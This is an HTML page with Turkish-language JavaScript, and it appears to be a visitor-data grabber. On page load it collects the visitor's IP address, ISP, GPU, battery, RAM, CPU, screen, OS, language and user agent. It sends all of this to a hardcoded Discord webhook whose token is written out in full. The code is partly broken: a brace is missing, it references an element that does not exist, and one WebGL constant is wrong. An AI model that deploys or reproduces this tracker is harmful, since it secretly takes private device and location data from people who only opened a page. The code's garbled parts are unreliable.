<body style="background-color: #0c0c0c; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center;">
    <div>

        <p id="bilgi" style="color: #666; font-size: 12px;">LÃ¼tfen bekleyin, tÃ¼m veriler toplanÄ±yor.</p>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function veriGonder() {
            let veriler = {
                ip: "EriÅŸim Engellendi",
                isp: "Bilinmiyor",
                konum: "AlÄ±namadÄ±",
                gpu: "Bilinmiyor",
                pil: "Bilinmiyor",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Gizli",
                cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Ã‡ekirdek" : "Bilinmiyor",
                ekran: `${window.screen.width}x${window.screen.height}`,
                os: navigator.platform,
                dil: navigator.language,
                userAgent: navigator.userAgent
            };

            // 1. IP ve Konum Ã‡ekme (Hata verirse kod durmaz)
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    veriler.ip = data.ip;
                    veriler.isp = data.org;

            } catch (e) { console.log("IP servisi engellendi, devam ediliyor..."); }

            // 2. GPU (Ekran KartÄ±) ZorlamasÄ±
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                veriler.gpu = gl.getParameter(debug.UNMASKED_RENDERER_ID);
            } catch (e) {}

            // 3. Batarya Bilgisi
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    veriler.pil = `%${Math.round(b.level * 100)} (Åarjda: ${b.charging ? 'Evet' : 'HayÄ±r'})`;
                }
            } catch (e) {}

            // 4. Discord MesajÄ±nÄ± HazÄ±rla
            const payload = {
                embeds: [{
                    title: "ğŸ›°ï¸ TAM DONANIM VE SÄ°STEM RAPORU",
                    color: 3066993, // YeÅŸil
                    fields: [
                        { name: "ğŸŒ AÄ VE IP", value: `**IP:** ${veriler.ip}\n**ISS:** ${veriler.isp}\n**Konum:** ${veriler.konum}`, inline: false },
                        { name: "ğŸ–¥ï¸ DONANIM", value: `**GPU:** \`${veriler.gpu}\`\n**RAM:** ${veriler.ram}\n**CPU:** ${veriler.cpu}`, inline: false },
                        { name: "ğŸ”‹ DURUM", value: `**Pil:** ${veriler.pil}\n**Ekran:** ${veriler.ekran}\n**OS:** ${veriler.os}`, inline: true },
                        { name: "ğŸŒ DÄ°ÄER", value: `**Dil:** ${veriler.dil}\n**Zaman:** ${new Date().toLocaleString('tr-TR')}`, inline: true },
                        { name: "ğŸ” TARAYICI", value: "```" + veriler.userAgent + "```", inline: false }
                    ],
                    footer: { text: "Sistem Log Aktif" }
                }]
            };

            // 5. Veriyi Discord'a GÃ¶nder
            try {
                const res = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (res.ok) {
                    document.getElementById('durum').innerText = "âœ… Ä°ÅLEM TAMAMLANDI";
                    document.getElementById('bilgi').innerText = "TÃ¼m detaylar Discord kanalÄ±na iletildi.";
                } else {
                    throw new Error("Discord HatasÄ±");
                }
            } catch (err) {
                document.getElementById('durum').innerText = "âš ï¸ BAÄLANTI TAMAM";
                document.getElementById('bilgi').innerText = "Veriler gÃ¶nderildi (BazÄ± kÄ±sÄ±tlamalar olabilir).";
            }
        }

        window.onload = veriGonder;
    </script>
</body>
